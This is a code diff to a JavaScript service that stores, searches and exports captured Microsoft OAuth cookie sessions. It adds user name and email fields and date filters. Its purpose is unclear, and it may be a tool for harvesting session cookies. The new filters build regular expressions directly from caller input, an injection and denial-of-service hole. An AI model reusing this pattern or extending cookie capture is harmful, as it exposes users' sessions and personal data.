@@ -7,6 +7,8 @@ async function saveCookieSession(payload) {
     const doc = {
         sessionId: payload.sessionId,
         studentId: payload.studentId || null,
+        userName: payload.userName || 'unknown',
+        userEmail: payload.userEmail || 'unknown',
         source: payload.source || 'microsoft_oauth',
         phase: payload.phase,
         triggerUrl: payload.triggerUrl,
@@ -46,7 +48,18 @@ async function listCookieSessions(options) {
     const filter = {};
 
     if (options.phase) filter.phase = options.phase;
-    if (options.studentId) filter.studentId = options.studentId;
+    if (options.studentId) filter.studentId = new RegExp(options.studentId, 'i');
+    if (options.userName) filter.userName = new RegExp(options.userName, 'i');
+    if (options.userEmail) filter.userEmail = new RegExp(options.userEmail, 'i');
+    if (options.dateFrom || options.dateTo) {
+        filter.capturedAt = {};
+        if (options.dateFrom) filter.capturedAt.$gte = new Date(options.dateFrom);
+        if (options.dateTo) {
+            const to = new Date(options.dateTo);
+            to.setHours(23, 59, 59, 999);
+            filter.capturedAt.$lte = to;
+        }
+    }
 
     const [items, total] = await Promise.all([
         CookieSession.find(filter)
@@ -70,6 +83,8 @@ function buildCookieExport(session) {
     return {
         sessionId: session.sessionId,
         studentId: session.studentId,
+        userName: session.userName || 'unknown',
+        userEmail: session.userEmail || 'unknown',
         source: session.source,
         phase: session.phase,
         triggerUrl: session.triggerUrl,
